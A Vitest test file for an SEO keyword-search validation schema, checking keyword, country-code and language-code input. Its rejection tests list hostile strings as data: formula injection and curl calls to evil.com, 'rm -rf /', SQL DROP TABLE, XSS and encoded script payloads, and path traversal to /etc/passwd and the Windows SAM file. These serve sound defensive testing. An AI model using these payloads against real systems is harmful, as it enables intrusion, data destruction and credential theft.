import { describe, it, expect } from 'vitest'
import {
  KeywordSearchSchema,
  KeywordInputSchema,
} from '@/lib/validation/schemas'

describe('Strict Input Validation Schema', () => {
  describe('KeywordSearchSchema', () => {
    describe('keyword validation', () => {
      it('accepts valid keywords with alphanumeric, spaces, hyphens, underscores', () => {
        const validKeywords = [
          'SEO tools',
          'keyword-research',
          'content_marketing',
          'web-development_2024',
          'React Native',
          'API-testing',
          'user_experience',
        ]

        const result = KeywordSearchSchema.safeParse({
          keywords: validKeywords,
          matchType: 'phrase',
        })

        expect(result.success).toBe(true)
      })

      it('rejects keywords with dangerous characters', () => {
        const dangerousKeywords = [
          '=IMPORTXML("http://evil.com")', // Formula injection
          '<script>alert("xss")</script>', // XSS
          'keyword; DROP TABLE users;', // SQL injection
          'keyword & rm -rf /', // Command injection
          'keyword|curl evil.com', // Command chaining
          'keyword`whoami`', // Command substitution
          'keyword$(date)', // Command substitution
          'keyword%3Cscript%3E', // URL encoded script
          'keyword\x00null', // Null byte injection
          'keyword\r\nheader: value', // Header injection
        ]

        dangerousKeywords.forEach(keyword => {
          const result = KeywordSearchSchema.safeParse({
            keywords: [keyword],
            matchType: 'phrase',
          })

          expect(result.success).toBe(false)
          if (!result.success) {
            expect(result.error.issues[0].message).toContain(
              'must contain only letters, numbers, spaces, hyphens, and underscores'
            )
          }
        })
      })

      it('rejects empty keywords', () => {
        const result = KeywordSearchSchema.safeParse({
          keywords: ['valid keyword', '', 'another valid'],
          matchType: 'phrase',
        })

        expect(result.success).toBe(false)
        if (!result.success) {
          expect(result.error.issues[0].message).toContain(
            'Keyword cannot be empty'
          )
        }
      })

      it('rejects keywords that are too long', () => {
        const longKeyword = 'a'.repeat(101) // Over 100 character limit

        const result = KeywordSearchSchema.safeParse({
          keywords: [longKeyword],
          matchType: 'phrase',
        })

        expect(result.success).toBe(false)
        if (!result.success) {
          expect(result.error.issues[0].message).toContain(
            'too long (max 100 chars)'
          )
        }
      })

      it('rejects too many keywords', () => {
        const tooManyKeywords = Array(201).fill('valid keyword') // Over 200 limit

        const result = KeywordSearchSchema.safeParse({
          keywords: tooManyKeywords,
          matchType: 'phrase',
        })

        expect(result.success).toBe(false)
        if (!result.success) {
          expect(result.error.issues[0].message).toContain(
            'Maximum 200 keywords'
          )
        }
      })

      it('trims whitespace from keywords', () => {
        const result = KeywordSearchSchema.safeParse({
          keywords: ['  keyword with spaces  ', '\tindented keyword\t'],
          matchType: 'phrase',
        })

        expect(result.success).toBe(true)
        if (result.success) {
          expect(result.data.keywords).toEqual([
            'keyword with spaces',
            'indented keyword',
          ])
        }
      })
    })

    describe('location validation', () => {
      it('accepts valid 2-letter country codes', () => {
        const validCodes = ['US', 'GB', 'CA', 'AU', 'DE', 'FR', 'IN', 'GL']

        validCodes.forEach(location => {
          const result = KeywordSearchSchema.safeParse({
            keywords: ['test'],
            matchType: 'phrase',
            location,
          })

          expect(result.success).toBe(true)
        })
      })

      it('rejects invalid location formats', () => {
        const invalidLocations = [
          'USA', // 3 letters
          'United States', // Full country name
          'us', // Lowercase
          'U', // 1 letter
          'U1', // Contains number
          'U$', // Contains special character
          'U S', // Contains space
        ]

        invalidLocations.forEach(location => {
          const result = KeywordSearchSchema.safeParse({
            keywords: ['test'],
            matchType: 'phrase',
            location,
          })

          expect(result.success).toBe(false)
          if (!result.success) {
            expect(result.error.issues[0].message).toContain(
              'Location must be one of'
            )
          }
        })
      })

      it('allows undefined location', () => {
        const result = KeywordSearchSchema.safeParse({
          keywords: ['test'],
          matchType: 'phrase',
          // location not provided
        })

        expect(result.success).toBe(true)
      })

      it('transforms empty string to undefined', () => {
        const result = KeywordSearchSchema.safeParse({
          keywords: ['test'],
          matchType: 'phrase',
          location: '',
        })

        expect(result.success).toBe(true)
        if (result.success) {
          expect(result.data.location).toBeUndefined()
        }
      })
    })

    describe('language validation', () => {
      it('accepts valid language codes', () => {
        const validLanguages = [
          'en',
          'es',
          'fr',
          'de',
          'ja',
          'zh',
          'en-US',
          'en-GB',
          'fr-FR',
        ]

        validLanguages.forEach(language => {
          const result = KeywordSearchSchema.safeParse({
            keywords: ['test'],
            matchType: 'phrase',
            language,
          })

          expect(result.success).toBe(true)
        })
      })

      it('rejects invalid language formats', () => {
        const invalidLanguages = [
          'ENG', // 3 letters
          'english', // Full language name
          'EN', // Uppercase
          'en-us', // Lowercase country
          'e', // 1 letter
          'en-U', // 1 letter country
          'en_US', // Underscore instead of hyphen
          'en-USA', // 3 letter country
        ]

        invalidLanguages.forEach(language => {
          const result = KeywordSearchSchema.safeParse({
            keywords: ['test'],
            matchType: 'phrase',
            language,
          })

          expect(result.success).toBe(false)
          if (!result.success) {
            expect(result.error.issues[0].message).toContain(
              'valid language code'
            )
          }
        })
      })

      it('allows undefined language', () => {
        const result = KeywordSearchSchema.safeParse({
          keywords: ['test'],
          matchType: 'phrase',
          // language not provided
        })

        expect(result.success).toBe(true)
      })

      it('transforms empty string to undefined', () => {
        const result = KeywordSearchSchema.safeParse({
          keywords: ['test'],
          matchType: 'phrase',
          language: '',
        })

        expect(result.success).toBe(true)
        if (result.success) {
          expect(result.data.language).toBeUndefined()
        }
      })
    })
  })

  describe('KeywordInputSchema', () => {
    it('accepts valid form input', () => {
      const result = KeywordInputSchema.safeParse({
        keywordsInput: 'SEO tools, keyword research, content marketing',
        matchType: 'phrase',
        location: 'US',
      })

      expect(result.success).toBe(true)
    })

    it('rejects empty keyword input', () => {
      const result = KeywordInputSchema.safeParse({
        keywordsInput: '',
        matchType: 'phrase',
        location: 'US',
      })

      expect(result.success).toBe(false)
      if (!result.success) {
        expect(result.error.issues[0].message).toContain(
          'Please enter at least one keyword'
        )
      }
    })

    it('rejects input that is too large', () => {
      const largeInput = 'keyword,'.repeat(10000) // Very large input

      const result = KeywordInputSchema.safeParse({
        keywordsInput: largeInput,
        matchType: 'phrase',
        location: 'US',
      })

      expect(result.success).toBe(false)
      if (!result.success) {
        expect(result.error.issues[0].message).toContain('Input too large')
      }
    })

    it('defaults location to US when empty', () => {
      const result = KeywordInputSchema.safeParse({
        keywordsInput: 'test keywords',
        matchType: 'phrase',
        location: '',
      })

      expect(result.success).toBe(true)
      if (result.success) {
        expect(result.data.location).toBe('US')
      }
    })

    it('validates location format', () => {
      const result = KeywordInputSchema.safeParse({
        keywordsInput: 'test keywords',
        matchType: 'phrase',
        location: 'USA', // Invalid format
      })

      expect(result.success).toBe(false)
      if (!result.success) {
        expect(result.error.issues[0].message).toContain(
          'Location must be one of'
        )
      }
    })

    it('trims whitespace from input', () => {
      const result = KeywordInputSchema.safeParse({
        keywordsInput: '  SEO tools, keyword research  ',
        matchType: 'phrase',
        location: '  US  ',
      })

      expect(result.success).toBe(true)
      if (result.success) {
        expect(result.data.keywordsInput).toBe('SEO tools, keyword research')
        expect(result.data.location).toBe('US')
      }
    })
  })

  describe('Security Edge Cases', () => {
    it('prevents injection attacks through various encoding methods', () => {
      const injectionAttempts = [
        '%3Cscript%3Ealert%281%29%3C%2Fscript%3E', // URL encoded script
        '&#60;script&#62;alert(1)&#60;/script&#62;', // HTML entity encoded script
        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', // Unicode escaped script
        'jaVaScRiPt:alert(1)', // Case variation
        'data:text/html,<script>alert(1)</script>', // Data URI
        'javascript://comment%0aalert(1)', // JavaScript with comment bypass
      ]

      injectionAttempts.forEach(malicious => {
        const result = KeywordSearchSchema.safeParse({
          keywords: [malicious],
          matchType: 'phrase',
        })

        expect(result.success).toBe(false)
      })
    })

    it('prevents path traversal attempts', () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd',
        '..\\..\\..\\/etc/passwd',
      ]

      pathTraversalAttempts.forEach(malicious => {
        const result = KeywordSearchSchema.safeParse({
          keywords: [malicious],
          matchType: 'phrase',
        })

        expect(result.success).toBe(false)
      })
    })
  })
})
